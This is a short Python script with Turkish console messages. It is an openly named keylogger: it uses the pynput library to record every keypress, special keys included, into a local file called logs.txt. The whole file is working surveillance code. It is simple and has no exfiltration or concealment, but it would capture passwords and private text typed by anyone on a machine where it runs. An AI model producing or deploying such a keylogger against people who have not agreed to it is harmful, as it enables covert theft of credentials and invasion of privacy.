import pynput.keyboard

log = open("logs.txt", "w")

def callback_function(key):
    try:
        print('Alfanumerik anahtar {0} tuşlandı'.format(key.char))
        log.write(key.char)
        log.flush()
        
    except AttributeError:
        print('Özel anahtar {0} tuşlandı'.format(key))
       
        if key == key.space:
            tus = " "
        elif key == key.enter:
            tus = "\n[ENTER]\n"
        elif key == key.backspace:
            tus="\n[BACKSPACE]"
        elif key == key.tab:
            tus="\n[TAB]"
        elif key == key.caps_lock:
            tus="\n[CAPSLOCK]"
        elif key == key.shift or key == key.shift_r:
            tus="\n[SHIFT]"
        elif key == key.ctrl_l or key == key.ctrl_r:
            tus="\n[CTRL]"
        elif key == key.esc:
            tus="\n[ESC]" 
        else:
            tus = str(key)

        log.write(tus)
        log.flush()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()

log.close()
    
